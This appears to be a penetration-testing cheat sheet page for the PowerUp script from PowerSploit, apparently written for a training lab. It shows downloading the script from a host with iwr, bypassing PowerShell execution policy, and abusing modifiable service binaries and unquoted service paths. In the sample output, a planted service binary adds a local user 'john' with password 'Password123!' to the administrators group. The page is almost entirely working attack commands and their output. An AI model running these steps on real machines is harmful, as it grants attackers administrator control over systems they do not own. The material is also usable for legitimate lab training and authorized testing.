---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PowerUp

{% tabs %}
{% tab title="1. Location" %}
```bash
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
```
{% endtab %}

{% tab title="2. Transfer" %}
```powershell
iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1

```
{% endtab %}

{% tab title="3. Execute" %}
```powershell
> powershell -ep bypass
>  . .\PowerUp.ps1
```
{% endtab %}
{% endtabs %}

Services' commands.

{% tabs %}
{% tab title="1. Status" %}
```powershell
Get-Service -Name 'BackupMonitor'
```
{% endtab %}

{% tab title="2. Start/Stop" %}
```powershell
> Start-Service -Name "<ServiceName>"
> Stop-Service -Name "<ServiceName>" -Force
```
{% endtab %}

{% tab title="3. Restart" %}
```powershell
Restart-Service -Name 'BackupMonitor' -Force
```
{% endtab %}
{% endtabs %}

## Service Binary Hijacking

{% tabs %}
{% tab title="1. Enumerate" %}
{% code overflow="wrap" %}
```powershell
Get-ModifiableServiceFile
```
{% endcode %}
{% endtab %}

{% tab title="2. Abuse" %}
{% code overflow="wrap" %}
```powershell
Install-ServiceBinary -Name 'mysql'
```
{% endcode %}
{% endtab %}

{% tab title="3. Restart" %}
```powershell
Restart-Service -Name 'mysqld' -Force
```
{% endtab %}

{% tab title="4. Confirm" %}
```powershell
> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    john            offsec
steve                    WDAGUtilityAccount

The command completed successfully.

> net localgroup administrators
...
john
...
```
{% endtab %}
{% endtabs %}

## Unquoted Service Paths

{% tabs %}
{% tab title="1. Enumerate" %}
{% code overflow="wrap" %}
```powershell
> Get-UnquotedService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService
...
```
{% endcode %}
{% endtab %}

{% tab title="2. Abuse" %}
{% code overflow="wrap" %}
```powershell
> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

ServiceName  Path                                         Command
-----------  ----                                         -------
GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...
```
{% endcode %}
{% endtab %}

{% tab title="3. Restart" %}
{% code overflow="wrap" %}
```powershell
> Restart-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...
Restart-Service : Failed to start service 'GammaService (GammaService)'.
At line:1 char:1
+ Restart-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
   , ServiceCommandException
    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand
```
{% endcode %}
{% endtab %}

{% tab title="4. Confirm" %}
```powershell
> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    john            offsec
steve                    WDAGUtilityAccount

The command completed successfully.

> net localgroup administrators
...
john
...
```
{% endtab %}
{% endtabs %}





